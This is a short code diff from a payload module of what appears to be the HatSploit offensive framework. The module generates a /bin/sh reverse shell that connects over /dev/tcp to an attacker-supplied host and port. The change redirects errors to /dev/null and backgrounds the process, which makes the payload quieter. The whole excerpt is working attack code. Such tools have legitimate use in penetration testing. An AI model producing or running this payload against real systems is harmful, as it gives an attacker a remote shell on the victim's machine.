@@ -67,9 +67,9 @@ class HatSploitPayload(HatSploitPayload):
         self.badges.output_process("Generating payload...")
 
         if prompt in ['yes', 'y']:
-            payload = f"/bin/sh -i &>/dev/tcp/{local_host}/{local_port} 0>&1"
+            payload = f"/bin/sh -i &>/dev/tcp/{local_host}/{local_port} 0>&1 2>/dev/null &"
         else:
-            payload = f"/bin/sh &>/dev/tcp/{local_host}/{local_port} 0>&1"
+            payload = f"/bin/sh &>/dev/tcp/{local_host}/{local_port} 0>&1 2>/dev/null &"
 
         self.method['Payload'] = payload
         self.method['Instructions'] = payload
